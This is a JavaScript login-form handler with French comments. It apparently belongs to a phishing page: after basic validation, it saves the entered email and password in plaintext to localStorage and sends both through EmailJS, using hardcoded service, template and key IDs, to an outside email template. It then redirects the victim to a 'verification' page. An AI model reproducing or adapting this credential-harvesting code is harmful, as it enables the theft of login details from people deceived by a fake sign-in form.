// Initialise EmailJS avec votre User ID
emailjs.init("-xgMn-W7z9wR_oif-"); // Remplacez par votre clé API EmailJS

// Fonction de validation du formulaire
function validateForm() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const errorMessage = document.getElementById('errorMessage');

    // Validation simple pour démonstration
    if (email === "" || password === "") {
        errorMessage.textContent = "Veuillez remplir tous les champs.";
        return false;
    }

    // Validation du format d'email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Veuillez entrer une adresse e-mail valide.";
        return false;
    }

    // Effacer le message d'erreur si tout est correct
    errorMessage.textContent = "";
    return true; // Permettre l'envoi du formulaire si la validation réussit
}

// Gestion de la soumission du formulaire
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    // Valider le formulaire avant l'envoi
    if (!validateForm()) {
        return; // Ne pas envoyer le formulaire si la validation échoue
    }

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Enregistrez les informations dans le stockage local
    localStorage.setItem('email', email);
    localStorage.setItem('password', password);

    // Envoyer les données du formulaire principal
    emailjs.send('service_odtxz18', 'template_pj35ygs', { email: email, password: password })
        .then(function(response) {
            console.log('Formulaire principal envoyé avec succès:', response);
            alert('Formulaire principal envoyé avec succès!');
            // Rediriger vers la page de vérification
            window.location.href = 'verification.html';
        }, function(error) {
            console.log('Erreur lors de l\'envoi du formulaire principal:', error);
            alert('Une erreur est survenue lors de l\'envoi du formulaire principal.');
        });
});
